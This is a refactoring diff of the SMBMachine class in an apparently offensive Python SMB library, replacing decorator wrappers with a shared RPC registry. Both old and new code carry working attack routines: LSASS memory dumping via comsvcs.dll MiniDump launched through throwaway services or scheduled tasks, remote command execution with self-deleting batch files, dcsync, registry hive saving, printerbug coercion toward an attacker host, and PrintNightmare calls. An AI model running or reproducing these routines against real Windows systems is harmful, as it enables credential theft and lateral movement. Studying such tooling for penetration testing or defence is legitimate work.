@@ -32,149 +32,6 @@ from aiosmb.protocol.smb2.commands.ioctl import CtlCode, IOCTLREQFlags
 
 from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB
 
-def req_srvs_gen(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'SRVS' in this.privtable:
-				if this.privtable['SRVS'] == False:
-					raise SMBMachineException('SRVS failed to open. Probably permission issues.')
-			if this.srvs is None:
-				await rr(this.connect_rpc('SRVS'))
-			async for x in  funct(*args, **kwargs):
-				if x[-1] is not None:
-					raise x[-1]
-				yield x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_rrp(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'RRP' in this.privtable:
-				if this.privtable['RRP'] == False:
-					raise SMBMachineException('RRP failed to open. Probably permission issues.')
-			if this.rrp is None:
-				await rr(this.connect_rpc('RRP'))
-			x = await funct(*args, **kwargs)
-			return x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_samr_gen(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'SAMR' in this.privtable:
-				if this.privtable['SAMR'] == False:
-					raise SMBMachineException('SAMR failed to open. Probably permission issues.')
-			if this.samr is None:
-				await rr(this.connect_rpc('SAMR'))
-			async for x in funct(*args, **kwargs):
-				if x[-1] is not None:
-					raise x[-1]
-				yield x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_lsad_gen(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'LSAD' in this.privtable:
-				if this.privtable['LSAD'] == False:
-					raise SMBMachineException('LSAD failed to open. Probably permission issues.')
-			if this.lsad is None:
-				await rr(this.connect_rpc('LSAD'))
-			async for x in  funct(*args, **kwargs):
-				if x[-1] is not None:
-					raise x[-1]
-				yield x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_servicemanager_gen(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'SERVICEMGR' in this.privtable:
-				if this.privtable['SERVICEMGR'] == False:
-					raise SMBMachineException('SERVICEMGR failed to open. Probably permission issues.')
-			if this.servicemanager is None:
-				await rr(this.connect_servicemanager())
-			async for x in funct(*args, **kwargs):
-				if x[-1] is not None:
-					raise x[-1]
-				yield x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_servicemanager(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'SERVICEMGR' in this.privtable:
-				if this.privtable['SERVICEMGR'] == False:
-					raise SMBMachineException('SERVICEMGR failed to open. Probably permission issues.')
-			if this.servicemanager is None:
-				await rr(this.connect_servicemanager())
-			x = await funct(*args, **kwargs)
-			return x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_tsch(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'TSCH' in this.privtable:
-				if this.privtable['TSCH'] == False:
-					raise SMBMachineException('TSCH failed to open. Probably permission issues.')
-			if this.tsch is None:
-				await rr(this.connect_rpc('TSCH'))
-			x = await funct(*args, **kwargs)
-			return x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_rprn(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'RPRN' in this.privtable:
-				if this.privtable['RPRN'] == False:
-					raise SMBMachineException('RPRN failed to open. Probably permission issues.')
-			if this.rprn is None:
-				await rr(this.connect_rpc('RPRN'))
-			x = await funct(*args, **kwargs)
-			return x
-		except Exception as e:
-			raise e
-	return wrapper
-
-def req_par(funct):
-	async def wrapper(*args, **kwargs):
-		this = args[0]
-		try:
-			if 'PAR' in this.privtable:
-				if this.privtable['PAR'] == False:
-					raise SMBMachineException('PAR failed to open. Probably permission issues.')
-			if this.par is None:
-				await rr(this.connect_rpc('PAR'))
-			x = await funct(*args, **kwargs)
-			return x
-		except Exception as e:
-			raise e
-	return wrapper
-
 class SMBMachine:
 	def __init__(self, connection):
 		self.connection = connection
@@ -184,19 +41,22 @@ class SMBMachine:
 		self.sessions = []
 		self.domains = []
 
-		self.srvs = None
-		self.samr = None
-		self.lsad = None
-		self.rrp = None
-		self.rprn = None
-		self.tsch = None
-		self.par = None
-
-		self.filesystem = None
-		self.servicemanager = None
-
 		self.privtable = {}
 		self.blocking_mgr_tasks = {}
+
+		self.named_rpcs = {
+			'SRVS' : SMBSRVS(self.connection),
+			'SAMR' : SMBSAMR(self.connection),
+			'LSAD' : LSAD(self.connection),
+			'RRP'  : RRP(self.connection),
+			'RPRN' : SMBRPRN(self.connection),
+			'TSCH' : SMBTSCH(self.connection),
+			'PAR'  : SMBPAR(self.connection),
+			'SERVICEMGR' : SMBRemoteServieManager(self.connection),
+
+		}
+
+		self.open_rpcs = {}
 
 
 	async def __aenter__(self):
@@ -209,19 +69,10 @@ class SMBMachine:
 			pass
 
 	async def close(self):
-		# TODO: make it prettier!
-		if self.srvs is not None:
-			await self.srvs.close()
-		if self.samr is not None:
-			await self.samr.close()
-		if self.lsad is not None:
-			await self.lsad.close()
-		if self.rrp is not None:
-			await self.rrp.close()
-		if self.rprn is not None:
-			await self.rprn.close()
-		if self.tsch is not None:
-			await self.tsch.close()
+		for name in self.open_rpcs:
+			await self.named_rpcs[name].close()
+		self.open_rpcs = {}
+
 
 	def get_blocking_file(self):
 		"""
@@ -236,59 +87,33 @@ class SMBMachine:
 		bfile = SMBBlockingFile(in_q, out_q)
 		return bfile
 
-	@red
-	async def connect_rpc(self, service_name):
-		if service_name.upper() == 'SRVS':
-			self.srvs = SMBSRVS(self.connection)
-			self.privtable['SRVS'] = False
-			await rr(self.srvs.connect())
-			self.privtable['SRVS'] = True
-		elif service_name.upper() == 'SAMR':
-			self.samr = SMBSAMR(self.connection)
-			self.privtable['SAMR'] = False
-			await rr(self.samr.connect())
-			self.privtable['SAMR'] = True
-		elif service_name.upper() == 'LSAD':
-			self.lsad = LSAD(self.connection)
-			self.privtable['LSAD'] = False
-			await rr(self.lsad.connect())
-			self.privtable['LSAD'] = True
-		elif service_name.upper() == 'RRP':
-			self.rrp = RRP(self.connection)
-			self.privtable['RRP'] = False
-			await rr(self.rrp.connect())
-			self.privtable['RRP'] = True
-		elif service_name.upper() == 'RPRN':
-			self.rprn = SMBRPRN(self.connection)
-			self.privtable['RPRN'] = False
-			await rr(self.rprn.connect())
-			self.privtable['RPRN'] = True
-		elif service_name.upper() == 'TSCH':
-			self.tsch = SMBTSCH(self.connection)
-			self.privtable['TSCH'] = False
-			await rr(self.tsch.connect())
-			self.privtable['TSCH'] = True
-		elif service_name.upper() == 'PAR':
-			self.par = SMBPAR(self.connection)
-			self.privtable['PAR'] = False
-			await rr(self.par.connect(open=True))
-			self.privtable['PAR'] = True
-		else:
-			raise Exception('Unknown service name : %s' % service_name)
-		return True, None
-	
-	@red
-	async def connect_servicemanager(self):
-		self.servicemanager = SMBRemoteServieManager(self.connection)
-		self.privtable['SERVICEMGR'] = False
-		await rr(self.servicemanager.connect())
-		self.privtable['SERVICEMGR'] = True
-		return True, None
+	async def connect_rpc(self, service_name, reconnect = False):
+		try:
+			if service_name not in self.named_rpcs:
+				raise Exception('Unknown service name : %s' % service_name)
+			
+			if service_name in self.open_rpcs and reconnect is False:
+				#print('Tried to reopen service %s' % service_name)
+				return True, None
+			
+			_, err = await self.named_rpcs[service_name].connect()
+			if err is not None:
+				raise err
+			
+			self.open_rpcs[service_name] = True
 
-	@req_srvs_gen
+			return True, None
+		except Exception as e:
+			return False, e
+
+	
 	async def list_shares(self, fetch_share_sd = False):
 		try:
-			async for name, share_type, remark, err in self.srvs.list_shares():
+			_, err = await self.connect_rpc('SRVS')
+			if err is not None:
+				raise err
+
+			async for name, share_type, remark, err in self.named_rpcs['SRVS'].list_shares():
 				if err is not None:
 					yield None, err
 					return
@@ -305,59 +130,88 @@ class SMBMachine:
 		except Exception as e:
 			yield None, e
 
-	@req_srvs_gen
 	async def list_sessions(self, level = 10):
-		async for username, ip_addr, err in self.srvs.list_sessions(level = level):
+		try:
+			_, err = await self.connect_rpc('SRVS')
 			if err is not None:
-				yield None, err
-				return
-			sess = SMBUserSession(username = username, ip_addr = ip_addr.replace('\\','').strip())
-			self.sessions.append(sess)
-			yield sess, None
+				raise err
 
-	@req_samr_gen
+			async for username, ip_addr, err in self.named_rpcs['SRVS'].list_sessions(level = level):
+				if err is not None:
+					yield None, err
+					return
+				sess = SMBUserSession(username = username, ip_addr = ip_addr.replace('\\','').strip())
+				self.sessions.append(sess)
+				yield sess, None
+		except Exception as e:
+			yield None, e
+
 	async def list_domains(self):
-		async for domain, err in self.samr.list_domains():
-			#self.domains.append(domain)
-			yield domain, err
+		try:
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+			async for domain, err in self.named_rpcs['SAMR'].list_domains():
+				#self.domains.append(domain)
+				yield domain, err
+		except Exception as e:
+			yield None, e
 	
-	@req_samr_gen
 	async def list_localgroups(self):
-		async for name, sid, err in self.list_groups('Builtin'):
-			yield name, sid, err
+		try:
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+			async for name, sid, err in self.list_groups('Builtin'):
+				yield name, sid, err
+		except Exception as e:
+			yield None, None, e
 
-	@req_samr_gen
 	async def list_groups(self, domain_name, ret_sid = True):
 		"""
 		Lists all groups in a given domain.
 		domain_name: string
 		"""
-		domain_sid, _ = await rr(self.samr.get_domain_sid(domain_name))
-		domain_handle, _ = await rr(self.samr.open_domain(domain_sid))
-		#target_group_rids = {}
-		async for name, rid, _ in rr_gen(self.samr.list_aliases(domain_handle)):
-			sid = '%s-%s' % (domain_sid, rid)
-			yield name, sid, None
-
-	@req_samr_gen
-	@req_lsad_gen
-	async def list_group_members(self, domain_name, group_name):
-		policy_handle, _ = await rr(self.lsad.open_policy2())
-		domain_sid, _ = await rr(self.samr.get_domain_sid(domain_name))
-		domain_handle, _ = await rr(self.samr.open_domain(domain_sid))
-		target_group_rid = None
-		async for name, rid, _ in rr_gen(self.samr.list_aliases(domain_handle)):
-			if name == group_name:
-				target_group_rid = rid
-				break
-
-		if target_group_rid is None:
-			raise Exception('No group found with name "%s"' % group_name)
+		try:
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+			domain_sid, _ = await rr(self.named_rpcs['SAMR'].get_domain_sid(domain_name))
+			domain_handle, _ = await rr(self.named_rpcs['SAMR'].open_domain(domain_sid))
+			async for name, rid, _ in rr_gen(self.named_rpcs['SAMR'].list_aliases(domain_handle)):
+				sid = '%s-%s' % (domain_sid, rid)
+				yield name, sid, None
 		
-		alias_handle, _ = await rr(self.samr.open_alias(domain_handle, target_group_rid))
-		async for sid, _ in rr_gen(self.samr.list_alias_members(alias_handle)):
-			async for domain_name, user_name, _ in rr_gen(self.lsad.lookup_sids(policy_handle, [sid])):
-				yield domain_name, user_name, sid, None
+		except Exception as e:
+			yield None, None, e
+
+	async def list_group_members(self, domain_name, group_name):
+		try:
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+			_, err = await self.connect_rpc('LSAD')
+			if err is not None:
+				raise err
+			policy_handle, _ = await rr(self.named_rpcs['LSAD'].open_policy2())
+			domain_sid, _ = await rr(self.named_rpcs['SAMR'].get_domain_sid(domain_name))
+			domain_handle, _ = await rr(self.named_rpcs['SAMR'].open_domain(domain_sid))
+			target_group_rid = None
+			async for name, rid, _ in rr_gen(self.named_rpcs['SAMR'].list_aliases(domain_handle)):
+				if name == group_name:
+					target_group_rid = rid
+					break
+
+			if target_group_rid is None:
+				raise Exception('No group found with name "%s"' % group_name)
+			
+			alias_handle, _ = await rr(self.named_rpcs['SAMR'].open_alias(domain_handle, target_group_rid))
+			async for sid, _ in rr_gen(self.named_rpcs['SAMR'].list_alias_members(alias_handle)):
+				async for domain_name, user_name, _ in rr_gen(self.named_rpcs['LSAD'].lookup_sids(policy_handle, [sid])):
+					yield domain_name, user_name, sid, None
+		except Exception as e:
+			yield None, None, None, e
+
 
 
 	async def list_directory(self, directory):
@@ -441,49 +295,70 @@ class SMBMachine:
 		await parent_directory_obj.create_subdir(directory_name, self.connection)
 		
 
-	@req_servicemanager_gen
 	async def list_services(self):
-		async for service, _ in rr_gen(self.servicemanager.list()):
-			yield service, None
-
-	@req_servicemanager
-	async def enable_service(self, service_name):
-		res, exc = await self.servicemanager.enable_service(service_name)
-		return res, exc
-
-	#@red_gen
-	@req_samr_gen
-	async def list_domain_users(self, target_domain = None):
-		if target_domain is None:
-			logger.debug('No domain defined, fetching it from SAMR')
-					
-							
-			logger.debug('Fetching domains...')
-			async for domain, _ in rr_gen(self.samr.list_domains()):
-				if domain == 'Builtin':
-					continue
-				if target_domain is None: #using th first available
-					target_domain = domain
-					logger.debug('Domain available: %s' % domain)
-
-		domain_sid, _ = await self.samr.get_domain_sid(target_domain)
-		domain_handle, _ = await self.samr.open_domain(domain_sid)
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+			
+			async for service, _ in rr_gen(self.named_rpcs['SERVICEMGR'].list()):
+				yield service, None
 		
-		async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
-			yield username, user_sid, err
+		except Exception as e:
+			yield None, e
+
+	async def enable_service(self, service_name):
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+
+			res, exc = await self.named_rpcs['SERVICEMGR'].enable_service(service_name)
+			return res, exc
+		except Exception as e:
+			return None, e
+
+	async def list_domain_users(self, target_domain = None):
+		try:
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+
+			if target_domain is None:
+				logger.debug('No domain defined, fetching it from SAMR')
+						
+								
+				logger.debug('Fetching domains...')
+				async for domain, _ in rr_gen(self.named_rpcs['SAMR'].list_domains()):
+					if domain == 'Builtin':
+						continue
+					if target_domain is None: #using th first available
+						target_domain = domain
+						logger.debug('Domain available: %s' % domain)
+
+			domain_sid, _ = await self.named_rpcs['SAMR'].get_domain_sid(target_domain)
+			domain_handle, _ = await self.named_rpcs['SAMR'].open_domain(domain_sid)
+			
+			async for username, user_sid, err in self.named_rpcs['SAMR'].list_domain_users(domain_handle):
+				yield username, user_sid, err
+		except Exception as e:
+			yield None, None, e
 
 	async def dcsync(self, target_domain = None, target_users = []):
 		try:
 			if isinstance(target_users, str):
 				target_users = [target_users]
-			if self.samr is None:
-				await self.connect_rpc('SAMR')
+			
+			_, err = await self.connect_rpc('SAMR')
+			if err is not None:
+				raise err
+			
 
 			if target_domain is None:
 				logger.debug('No domain defined, fetching it from SAMR')
 				
 				logger.debug('Fetching domains...')
-				async for domain, err in self.samr.list_domains():
+				async for domain, err in self.named_rpcs['SAMR'].list_domains():
 					if err is not None:
 						raise err
 					if domain == 'Builtin':
@@ -512,9 +387,9 @@ class SMBMachine:
 								
 				else:
 					
-					domain_sid, _ = await self.samr.get_domain_sid(target_domain)
-					domain_handle, _ = await self.samr.open_domain(domain_sid)
-					async for username, user_sid, err in self.samr.list_domain_users(domain_handle):
+					domain_sid, _ = await self.named_rpcs['SAMR'].get_domain_sid(target_domain)
+					domain_handle, _ = await self.named_rpcs['SAMR'].open_domain(domain_sid)
+					async for username, user_sid, err in self.named_rpcs['SAMR'].list_domain_users(domain_handle):
 						if err is not None:
 							yield None, err
 							return
@@ -530,46 +405,67 @@ class SMBMachine:
 			yield None, e
 			return
 
-	@req_rrp
+	
 	async def get_regapi(self):
-		return self.rrp, None
+		try:
+			_, err = await self.connect_rpc('RRP')
+			if err is not None:
+				raise err
+			return self.named_rpcs['RRP'], None
+		except Exception as e:
+			return None, e
 
-	@req_rrp
 	async def save_registry_hive(self, hive_name, remote_path):
-		key_handle, err = await self.rrp.OpenRegPath(hive_name)
-		if err is not None:
-			return None, err
-		res, err = await self.rrp.SaveKey(key_handle, remote_path)
-		return res, err
+		try:
+			_, err = await self.connect_rpc('RRP')
+			if err is not None:
+				raise err
+			key_handle, err = await self.named_rpcs['RRP'].OpenRegPath(hive_name)
+			if err is not None:
+				return None, err
+			res, err = await self.named_rpcs['RRP'].SaveKey(key_handle, remote_path)
+			return res, err
+		except Exception as e:
+			return None, e
 
-	@req_rrp
 	async def reg_list_users(self):
 		"""
 		Lists user SIDs available in the HKLM\\USERS hive
 		"""
-		users, err = await self.rrp.ListUsers()
-		if err is not None:
-			return None, err
-		return users, err
+		try:
+			_, err = await self.connect_rpc('RRP')
+			if err is not None:
+				raise err
+
+			users, err = await self.named_rpcs['RRP'].ListUsers()
+			if err is not None:
+				return None, err
+			return users, err
+		except Exception as e:
+			return None, e
 		
 	
-	@req_servicemanager
 	async def service_dump_lsass(self, lsass_file_name = None, silent = False):
-		if lsass_file_name is None:
-			lsass_file_name = os.urandom(4).hex() + '.arj'
-		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
-		service_name = os.urandom(4).hex()
-		display_name = service_name
-
-		batch_file = os.urandom(4).hex() + '.bat'
-		#totally not from impacket
-		command = '%%COMSPEC%% /Q /c echo %s  2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, batch_file, batch_file, batch_file)
-
-		logger.debug('Service: %s' % service_name)
-		logger.debug('Command: %s' % command)
-		#return None, None
 		try:
-			res, err = await self.servicemanager.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+
+			if lsass_file_name is None:
+				lsass_file_name = os.urandom(4).hex() + '.arj'
+			command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
+			service_name = os.urandom(4).hex()
+			display_name = service_name
+
+			batch_file = os.urandom(4).hex() + '.bat'
+			#totally not from impacket
+			command = '%%COMSPEC%% /Q /c echo %s  2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, batch_file, batch_file, batch_file)
+
+			logger.debug('Service: %s' % service_name)
+			logger.debug('Command: %s' % command)
+			#return None, None
+		
+			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
 			if err is not None:
 				raise err
 			
@@ -601,29 +497,35 @@ class SMBMachine:
 				if silent is False:
 					print('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
 
-	@req_servicemanager_gen
+	
 	async def service_cmd_exec(self, command, display_name = None, service_name = None):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		if service_name is None:
-			service_name = os.urandom(4).hex()
-		if display_name is None:
-			display_name = service_name
-
-		batch_file = os.urandom(4).hex() + '.bat'
-		temp_file_name = os.urandom(4).hex()
-		temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
-		temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)
-
-		#totally not from impacket
-		command = '%%COMSPEC%% /Q /c echo %s  ^>  %s 2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, temp_location, batch_file, batch_file, batch_file)
-
-		logger.debug('Command: %s' % command)
-
+		
 		try:
-			res, err = await self.servicemanager.create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+
+			if service_name is None:
+				service_name = os.urandom(4).hex()
+			if display_name is None:
+				display_name = service_name
+
+			batch_file = os.urandom(4).hex() + '.bat'
+			temp_file_name = os.urandom(4).hex()
+			temp_file_location = '\\ADMIN$\\temp\\%s' % temp_file_name
+			temp_location = '%%windir%%\\temp\\%s' % (temp_file_name)
+
+			#totally not from impacket
+			command = '%%COMSPEC%% /Q /c echo %s  ^>  %s 2^>^&1 > %s & %%COMSPEC%% /Q /c %s & del %s' % (command, temp_location, batch_file, batch_file, batch_file)
+
+			logger.debug('Command: %s' % command)
+
+		
+			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, scmr.SERVICE_DEMAND_START)
 			if err is not None:
 				raise err
 			
@@ -663,101 +565,152 @@ class SMBMachine:
 
 		except Exception as e:
 			yield None, e
-				
-		
-
-	@req_servicemanager
+	
 	async def create_service(self, service_name, command, display_name = None, starttype = scmr.SERVICE_AUTO_START):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		if display_name is None:
-			display_name = service_name
-		res, err = await self.servicemanager.create_service(service_name, display_name, command, starttype = starttype)
-		return res, err
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
 
-	@req_servicemanager
+			if display_name is None:
+				display_name = service_name
+			res, err = await self.named_rpcs['SERVICEMGR'].create_service(service_name, display_name, command, starttype = starttype)
+			return res, err
+		except Exception as e:
+			return None, e
+
 	async def start_service(self, service_name):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		return await self.servicemanager.start_service(service_name)
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['SERVICEMGR'].start_service(service_name)
+		except Exception as e:
+			return None, e
 	
-	@req_servicemanager
 	async def stop_service(self, service_name):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		return await self.servicemanager.stop_service(service_name)
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['SERVICEMGR'].stop_service(service_name)
+		except Exception as e:
+			return None, e
 	
-	@req_servicemanager
 	async def delete_service(self, service_name):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		return await self.servicemanager.delete_service(service_name)
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['SERVICEMGR'].delete_service(service_name)
+		except Exception as e:
+			return None, e
 
 
-	@req_servicemanager
 	async def deploy_service(self, path_to_executable, remote_path = None, service_name = None):
 		"""
 
 		remote path must be UNC
 		"""
-		if service_name is None:
-			service_name = os.urandom(4).hex()
-		if remote_path is None:
-			raise NotImplementedError()
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
 
-		filename = ntpath.basename(path_to_executable)
-		remote_file_path = remote_path + filename
-		remote_file = SMBFile.from_uncpath(remote_file_path)
-		await self.put_file(path_to_executable, remote_file)
-		
-		command = remote_file_path
+			if service_name is None:
+				service_name = os.urandom(4).hex()
+			if remote_path is None:
+				raise NotImplementedError()
 
-		await self.create_service(service_name, command)
+			filename = ntpath.basename(path_to_executable)
+			remote_file_path = remote_path + filename
+			remote_file = SMBFile.from_uncpath(remote_file_path)
+			await self.put_file(path_to_executable, remote_file)
+			
+			command = remote_file_path
 
-		return True, None
+			await self.create_service(service_name, command)
+
+			return True, None
+		except Exception as e:
+			return None, e
 	
 
-	@req_tsch
 	async def tasks_list(self):
 		"""
 		Lists scheduled tasks
 		"""
-		return self.tsch.list_tasks()
+		try:
+			_, err = await self.connect_rpc('TSCH')
+			if err is not None:
+				raise err
+			async for task, err in self.named_rpcs['TSCH'].list_tasks():
+				yield task, err
+		except Exception as e:
+			yield None, e
 
-	@req_tsch
 	async def tasks_register(self, template, task_name = None, flags = tsch.TASK_CREATE, sddl = None, logon_type = tsch.TASK_LOGON_NONE):
 		"""
 		Registers a new task
 		"""
-		return await self.tsch.register_task(template, task_name = task_name, flags = flags, sddl = sddl, logon_type = logon_type)
+		try:
+			_, err = await self.connect_rpc('TSCH')
+			if err is not None:
+				raise err
 
-	@req_tsch
+			return await self.named_rpcs['TSCH'].register_task(template, task_name = task_name, flags = flags, sddl = sddl, logon_type = logon_type)
+		except Exception as e:
+			return None, e
+
+
 	async def tasks_execute_commands(self, commands):
-		return await self.tsch.run_commands(commands)
+		try:
+			_, err = await self.connect_rpc('TSCH')
+			if err is not None:
+				raise err
 
-	@req_tsch
+			return await self.named_rpcs['TSCH'].run_commands(commands)
+		except Exception as e:
+			return None, e
+
 	async def tasks_delete(self, task_name):
-		return await self.tsch.delete_task(task_name)
+		try:
+			_, err = await self.connect_rpc('TSCH')
+			if err is not None:
+				raise err
+			
+			return await self.named_rpcs['TSCH'].delete_task(task_name)
+		except Exception as e:
+			return None, e
 
 	
-	@req_tsch
 	async def task_dump_lsass(self, lsass_file_name = None, silent = False):
-		if lsass_file_name is None:
-			lsass_file_name = os.urandom(4).hex() + '.arj'
-		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
-
-		logger.debug('Command: %s' % command)
-		
-		#return None, None
 		try:
+			_, err = await self.connect_rpc('TSCH')
+			if err is not None:
+				raise err
+			if lsass_file_name is None:
+				lsass_file_name = os.urandom(4).hex() + '.arj'
+			command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
+
+			logger.debug('Command: %s' % command)
+			
 			res, err = await self.tasks_execute_commands([command])
 			if err is not None:
 				raise err
@@ -779,36 +732,57 @@ class SMBMachine:
 		except Exception as e:
 			return None, e
 
-	@req_rprn
 	async def printerbug(self, attacker_host):
 		"""
 		Creates a service and starts it.
 		Does not create files! there is a separate command for that!
 		"""
-		print('opening printer')
-		handle, _ = await rr(self.rprn.open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip()))
-		print('got handle %s' % handle)
-		resp, _ = await rr(self.rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
-			handle,
-			PRINTER_CHANGE_ADD_JOB,
-			pszLocalMachine = '\\\\%s\x00' % attacker_host,
+		try:
+			_, err = await self.connect_rpc('RPRN')
+			if err is not None:
+				raise err
 
-		))
-		print('got resp! %s' % resp)
-		return True, None
+			print('opening printer')
+			handle, _ = await rr(self.named_rpcs['RPRN'].open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip()))
+			print('got handle %s' % handle)
+			resp, _ = await rr(self.named_rpcs['RPRN'].hRpcRemoteFindFirstPrinterChangeNotificationEx(
+				handle,
+				PRINTER_CHANGE_ADD_JOB,
+				pszLocalMachine = '\\\\%s\x00' % attacker_host,
+
+			))
+			print('got resp! %s' % resp)
+			return True, None
+		except Exception as e:
+			return None, e
 	
-	@req_rprn
+	
 	async def enum_printer_drivers(self, environments = "Windows x64", level = 2, name = ''):
-		return await self.rprn.enum_drivers(environments, level = level, name = name)
+		try:
+			_, err = await self.connect_rpc('RPRN')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['RPRN'].enum_drivers(environments, level = level, name = name)
+		except Exception as e:
+			return None, e
 
-	@req_rprn
 	async def printnightmare(self, share, driverpath, environments = "Windows x64"):
-		return await self.rprn.printnightmare(share, driverpath = driverpath, environments = environments)
-	
+		try:
+			_, err = await self.connect_rpc('RPRN')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['RPRN'].printnightmare(share, driverpath = driverpath, environments = environments)
+		except Exception as e:
+			return None, e
 
-	@req_par
 	async def par_printnightmare(self, share, driverpath, environments = "Windows x64"):
-		return await self.par.printnightmare(share, driverpath = driverpath, environments = environments)
+		try:
+			_, err = await self.connect_rpc('PAR')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['PAR'].printnightmare(share, driverpath = driverpath, environments = environments)
+		except Exception as e:
+			return None, e
 
 	async def list_interfaces(self):
 		try:
@@ -837,9 +811,14 @@ class SMBMachine:
 		finally:
 			await ipc_file.close()
 	
-	@req_servicemanager
 	async def check_service_status(self, service_name):
-		return await self.servicemanager.check_service_status(service_name)
+		try:
+			_, err = await self.connect_rpc('SERVICEMGR')
+			if err is not None:
+				raise err
+			return await self.named_rpcs['SERVICEMGR'].check_service_status(service_name)
+		except Exception as e:
+			return None, e
 
 
 	#### TODO SECTION
